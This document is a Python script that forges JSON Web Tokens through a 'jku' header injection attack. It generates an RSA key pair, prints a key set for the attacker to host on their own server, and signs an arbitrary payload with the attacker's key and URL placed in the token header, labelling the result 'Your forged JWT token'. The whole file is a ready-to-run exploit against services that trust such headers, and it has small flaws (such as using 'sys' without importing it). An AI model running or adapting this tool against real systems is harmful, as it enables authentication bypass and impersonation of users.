import json, base64, os, argparse, hashlib, jwt, ast
from jose import jwk
from urllib.parse import urlparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def jwk_thumprint_rfc7638(jwk_dict: dict) -> str:
    #make sure that jwk_dict contains 'kty', 'n', 'e'
    members = {k: jwk_dict[k] for k in ("e", "kty", "n")}
    canonical = json.dumps(members, separators=(',', ':'), sort_keys=True)
    digest = hashlib.sha256(canonical.encode('utf-8')).digest()
    return b64url_encode(digest)

def validate_jku(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https') or not parsed.netloc:
        raise ValueError('Incorrect URL for --jku. Use full address with http/https.')
    if parsed.scheme != 'https':
        #technically possible, but HTTPS best
        print("WARNING: HTTPS use is recommended for jku.", file=sys.stderr)


parser = argparse.ArgumentParser(description='Generate JWKS, kid i signed JWT with jku directive.')
parser.add_argument('--jku', required=True, help='URL to be placed in JWT\'s header as "jku"')
parser.add_argument('--payload', required=True, help='JWT\'s payload. You may obtain the original payload by decoding the original JWT.')
parser.add_argument('--exp', type=int, default=1758930845, help='(optional) exp field (epoch) JWT\'s payload')
args = parser.parse_args()

try:
    validate_jku(args.jku)
except ValueError as e:
    print("Error:", e, file=sys.stderr)
    sys.exit(1)

# generate public and private key
os.system('openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048')
os.system('openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem')

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

#add kid
kid = jwk_thumprint_rfc7638(jwk_dict)

jwk_dict['kid'] = kid
jwks = {
    "keys": [
        jwk_dict
    ]
}

print("\n\nHost this payload on your server:\n")
print(json.dumps(jwks, indent=2))

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(ast.literal_eval(args.payload), private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict, 'jku': args.jku})

print("\n\nYour forged JWT token:\n")
print(token)

#cleanup
os.system('rm exploit_private.pem exploit_public.pem')
